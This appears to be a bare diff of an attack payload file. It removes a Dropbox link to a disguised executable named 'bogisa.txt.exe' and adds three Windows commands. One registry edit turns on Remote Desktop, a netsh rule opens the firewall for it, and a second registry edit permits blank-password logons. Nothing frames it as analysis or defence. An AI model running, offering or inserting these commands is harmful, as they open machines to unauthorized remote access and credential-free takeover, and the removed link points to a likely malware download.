@@ -1,1 +1,3 @@
-https://www.dropbox.com/scl/fi/127o5f9mmwrsr23buy2km/bogisa.txt.exe?rlkey=9t54h9a8kzw8ej2z6frv1twcl&dl=1
+reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+netsh advfirewall firewall set rule group=\"remote desktop\" new enable=Yes
+Reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v LimitBlankPasswordUse /t REG_DWORD /d 0 /f
